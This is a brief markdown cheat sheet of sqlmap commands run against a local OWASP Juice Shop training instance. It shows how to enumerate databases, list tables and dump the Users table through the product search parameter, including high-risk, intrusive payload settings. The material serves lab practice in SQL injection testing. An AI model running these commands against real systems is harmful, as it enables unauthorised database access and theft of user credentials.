# Commands for SQLMAP

These examples are referencing OWASP Juice Shop where I performed an SQLite Dump

## Simple command 
`` sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs

**--batch = auto answer defaults (so it doesn’t prompt you)
--dbs = enumerate databases**

## List tables
``sqlmap -u "http://localhost:3000/rest/products/search?q=apple" -D main --tables

## Table Dump
``sqlmap -u "http://localhost:3000/rest/products/search?q=apple" -D main -T Users --dump

## To test with more parameters for more dbs such as SQLLite use command
``sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --dbs --level=5 --risk=3

**--level 5 → tests more parameters & payloads

--risk 3 → includes potentially intrusive/time-based payloads**

## To List the tables present within this db
``sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --level=5 --risk=3 --dbms=SQLite --tables

## For dump 
sqlmap -u "http://localhost:3000/rest/products/search?q=apple" --batch --level=5 --risk=3 --dbms=SQLite -T Users --dump

** After -T, add any table name parameter listed after viewing the table list.